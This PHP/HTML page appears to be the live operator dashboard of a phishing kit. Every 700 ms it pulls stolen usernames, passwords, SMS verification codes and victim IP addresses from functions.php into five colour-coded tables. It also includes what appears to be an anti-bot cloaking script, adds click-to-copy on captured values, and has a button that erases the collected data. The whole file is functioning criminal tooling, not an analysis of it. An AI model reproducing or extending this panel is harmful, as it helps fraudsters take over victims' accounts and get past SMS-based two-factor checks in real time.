
<?php
require "../is_bot.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Table CIUDAD By Teacher</title>


    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="shortcut icon" href="">

    <link rel="stylesheet" href="./bulma.min.css" integrity="sha512-HqxHUkJM0SYcbvxUw5P60SzdOTy/QVwA1JJrvaXJv4q7lmbDZCmZaqz01UPOaQveoxfYRv1tHozWGPMcuTBuvQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        html{

            background: url("../documets/fre.jpg");
            background-color: black;
            background-repeat: no-repeat;
            background-position: center;
            background-attachment: fixed;

        }
        html{
            overflow: auto;

        }
        body {
            padding: 0 20px;
            width: 100vw;
            height: 100vh;

        }

        .column {
            display: flex;
            flex-direction: row;
            flex-wrap: nowrap;
            justify-content: center;



        }
        .colunmna {
            padding: 0.75rem;
            border: 1px solid #bdc3c721;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            background: linear-gradient(45deg, #222, #9f94ab);
           
            outline:none;
        }
        .table {
            background-color: transparent;

        }
        .table th, .table td {
        border: 1px solid #bdc3c7;
        padding: 8px;
        text-align: center;
        color: #fff;
        width: auto;

    }


    .has-background-danger-light {
        background-color: #e74c3c;

    }
    </style>
</head>
<body>
<div class="columns" style="width:1800px;">
<div class="colunmna" style="background-color: #B20059; padding: 0.75rem;">
        <table class="table is-hoverable">
            <thead>
            <tr>
                <th style="color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">#</th>
                <th style="color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">Usuario</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">Contraseña</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">SMS</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;"> SMS2</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">IP</th>
            </tr>
            </thead>
            <tbody id="primera">

            </tbody>
        </table>
    </div>
    <div class="colunmna" style= "background-color: #1F618D ; padding: 0.75rem">
        <table class="table is-hoverable">
            <thead>
            <tr>
                <th style="color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">#</th>
                <th style="color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">Usuario</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">Contraseña</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">SMS</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;"> SMS2</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">IP</th>
            </tr>
            </thead>
            <tbody id="segunda">

            </tbody>
        </table>
    </div>
    <div class="colunmna" style= "background-color: #E8C203 ; padding: 0.75rem">
        <table class="table is-hoverable">
            <thead>
            <tr>
                <th style="color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">#</th>
                <th style="color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">Usuario</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">Contraseña</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">SMS</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;"> SMS2</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">IP</th>
            </tr>
            </thead>
            <tbody id="tercera">

            </tbody>
        </table>
    </div>
    <div class="colunmna"style= "background-color: #FCEB00 ; padding: 0.75rem">
        <table class="table is-hoverable">
            <thead>
            <tr>
                <th style="color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">#</th>
                <th style="color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">Usuario</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">Contraseña</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">SMS</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;"> SMS2</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">IP</th>
            </tr>
            </thead>
            <tbody id="cuarta">

            </tbody>
        </table>
    </div>
    <div class="colunmna"style= "background-color: #E4062F ; padding: 0.75rem">
        <table class="table is-hoverable">
            <thead>
            <tr>
                <th style="color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">#</th>
                <th style="color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">Usuario</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">Contraseña</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">SMS</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;"> SMS2</th>
                <th style="color:#fff;color:#fff;text-shadow: 0 0 0.1em #8F7;text-shadow: 0 0 0.1em #F87, 0 0 0.1em #F87
                        ;text-shadow: 0 0 0.1em #87F, 0 0 0.2em #87F,0 0 0.1em #87F;">IP</th>
            </tr>
            </thead>
            <tbody id="quinta">

            </tbody>
        </table>
    </div>

    <script>
        function tabla(id, tabla) {
            var hace = "";
            $.ajax({
                type: 'POST',
                url: 'functions.php',
                data: {
                    "id1": id
                },
                cache: false,
                success: function(data, status) {
                    if (data.length > 42) {
                        var cuenta = 0;
                        var conte = JSON.parse(data);
                        for (let i = 0; i < conte.length; i++) {
                            ++cuenta;
                            if (conte) {
                                if (conte[i].Token == "No") {
                                    hace += "<tr><th>"+cuenta+"</th><td onclick='h(this)'>" + conte[i].Usuario + "</td><td onclick='h(this)'>" + conte[i].Clave + "</td><td onclick='h(this)' class='has-background-danger-light'>" + conte[i].Token + "</td><td onclick='h(this)' class='has-background-danger-light'>" + conte[i].Token3 + "</td><td>" + conte[i].Ip + "</td></tr>";
                                } else {
                                    hace += "<tr><th>"+cuenta+"</th><td onclick='h(this)'>" + conte[i].Usuario + "</td><td onclick='h(this)'>" + conte[i].Clave + "</td><td onclick='h(this)'>" + conte[i].Token + "</td><td onclick='h(this)'>" + conte[i].Token3 + "</td><td>" + conte[i].Ip + "</td></tr>";
                                }
                                document.querySelector("#" + tabla).innerHTML = hace;
                            } else {
                                hace += "<tr>< td colspan='6'>No hay datos</td></tr>";
                                document.querySelector("#" + tabla).innerHTML = hace;
                            }
                        }
                    } else {
                        hace += data;
                        document.querySelector("#" + tabla).innerHTML = hace;
                    }
                }
            });
        }

        setInterval(tabla, 700, 1, "primera");
        setInterval(tabla, 700, 2, "segunda");
        setInterval(tabla, 700, 3, "tercera");
        setInterval(tabla, 700, 4, "cuarta");
        setInterval(tabla, 700, 5, "quinta");

        function h(chacha) {
            copyToClipboard(chacha.innerHTML);
        }

        function copyToClipboard(text) {
            var dummy = document.createElement("textarea");
            document.body.appendChild(dummy);
            dummy.value = text;
            dummy.select();
            document.execCommand("copy");
            document.body.removeChild(dummy);
        }
    </script>
<style>
   #btnBorrar {
    position: fixed;
    bottom: 10px;
    right: 10px;
    background-color: #8B008B; /* Morado */
    color: #fff; /* Letras blancas */
    padding: 10px;
    border: none;
    cursor: pointer;
    border-radius: 50%; /* Hace que el botón sea redondo */
    box-shadow: 0 0 10px rgba(255, 255, 0, 0.2); /* Sombra amarilla muy opaca */
}

#btnBorrar:hover {
    background-color: #6A006A; /* Cambia el color al pasar el mouse */
}

</style>
<button id="btnBorrar">Borrar</button>
<script>
    document.getElementById("btnBorrar").addEventListener("click", function() {
        if (confirm("Guarda los datos antes de eliminar ¿Seguro que deseas borrar todo el contenido?")) {
            borrarContenido();
        }
    });

    function borrarContenido() {
        $.ajax({
            type: 'POST',
            url: 'borrar.php',
            cache: false,
            success: function(data, status) {
                alert(data);
            }
        });
    }
</script>

</body>


</html>